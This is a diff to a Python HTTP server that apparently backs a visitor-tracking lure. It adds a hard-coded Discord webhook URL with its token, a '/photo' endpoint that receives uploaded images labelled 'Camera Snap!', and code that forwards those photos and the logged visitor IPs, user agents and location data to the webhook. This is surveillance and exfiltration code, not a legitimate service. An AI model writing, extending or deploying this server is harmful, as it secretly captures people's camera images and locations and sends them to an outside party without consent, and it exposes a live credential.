@@ -1,8 +1,41 @@
 from http.server import BaseHTTPRequestHandler, HTTPServer
 import datetime
 import urllib.request
+import urllib.parse
 import json
 import os
+import io
+
+WEBHOOK = 'https://discord.com/api/webhooks/1487460729786470521/PkoLE23Gvw8YUn4XCYLGU69F3aZagIhjyB12VNTDkoknvrVRieCxIVVkjn6T4U9krlvh'
+
+def send_discord(msg):
+    try:
+        data = json.dumps({"content": msg}).encode()
+        req = urllib.request.Request(WEBHOOK, data=data, headers={'Content-Type': 'application/json'})
+        urllib.request.urlopen(req, timeout=10)
+    except Exception as e:
+        print(f"[!] Discord error: {e}", flush=True)
+
+def send_discord_photo(photo_bytes):
+    try:
+        boundary = b'----FormBoundary'
+        body = b'--' + boundary + b'\r\n'
+        body += b'Content-Disposition: form-data; name="file"; filename="photo.jpg"\r\n'
+        body += b'Content-Type: image/jpeg\r\n\r\n'
+        body += photo_bytes + b'\r\n'
+        body += b'--' + boundary + b'\r\n'
+        body += b'Content-Disposition: form-data; name="payload_json"\r\n\r\n'
+        body += json.dumps({"content": "📸 **Camera Snap!"}).encode()
+        body += b'\r\n--' + boundary + b'--\r\n'
+        req = urllib.request.Request(
+            WEBHOOK,
+            data=body,
+            headers={'Content-Type': f'multipart/form-data; boundary={boundary.decode()}'}
+        )
+        urllib.request.urlopen(req, timeout=10)
+        print("[+] Photo sent to Discord", flush=True)
+    except Exception as e:
+        print(f"[!] Photo send error: {e}", flush=True)
 
 def get_ip_info(ip):
     try:
@@ -67,6 +100,22 @@ def log_hit(ip, ua, extra={}):
         f.write(msg + '---\n')
     print(msg, flush=True)
 
+def parse_multipart(data, content_type):
+    boundary = None
+    for part in content_type.split(';'):
+        part = part.strip()
+        if part.startswith('boundary='):
+            boundary = part[9:].encode()
+    if not boundary:
+        return None
+    parts = data.split(b'--' + boundary)
+    for part in parts:
+        if b'filename="photo.jpg"' in part:
+            idx = part.find(b'\r\n\r\n')
+            if idx != -1:
+                return part[idx+4:].rstrip(b'\r\n--')
+    return None
+
 class Handler(BaseHTTPRequestHandler):
     def do_GET(self):
         if self.path == '/favicon.ico':
@@ -97,9 +146,11 @@ class Handler(BaseHTTPRequestHandler):
             self.end_headers()
 
     def do_POST(self):
+        content_type = self.headers.get('Content-Type', '')
+        length = int(self.headers.get('Content-Length', 0))
+        body = self.rfile.read(length)
+
         if self.path == '/track':
-            length = int(self.headers.get('Content-Length', 0))
-            body = self.rfile.read(length)
             try:
                 data = json.loads(body)
                 ip = self.client_address[0]
@@ -107,6 +158,17 @@ class Handler(BaseHTTPRequestHandler):
                 log_hit(ip, ua, extra=data)
             except Exception as e:
                 print(f"[!] POST error: {e}", flush=True)
+            self.send_response(200)
+            self.end_headers()
+
+        elif self.path == '/photo':
+            try:
+                photo = parse_multipart(body, content_type)
+                if photo:
+                    send_discord_photo(photo)
+                    print("[+] Photo received and sent", flush=True)
+            except Exception as e:
+                print(f"[!] Photo error: {e}", flush=True)
             self.send_response(200)
             self.end_headers()
 
